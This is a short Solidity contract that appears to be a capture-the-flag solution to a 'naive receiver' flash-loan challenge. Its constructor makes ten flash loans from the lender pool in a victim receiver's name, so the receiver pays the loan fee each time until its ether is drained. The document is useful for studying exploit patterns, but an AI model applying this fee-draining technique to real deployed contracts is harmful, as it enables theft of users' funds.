// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";

// receiver will pay lend fee everytime anyone will call lender pool..

contract Solution3 {
    NaiveReceiverLenderPool public pool;
    FlashLoanReceiver public receiver;

    constructor(NaiveReceiverLenderPool pool_, FlashLoanReceiver receiver_) {
        for (int i = 0; i < 10; ++i) {
            pool_.flashLoan(receiver_, pool_.ETH(), 1 ether, "");
        }
    }
}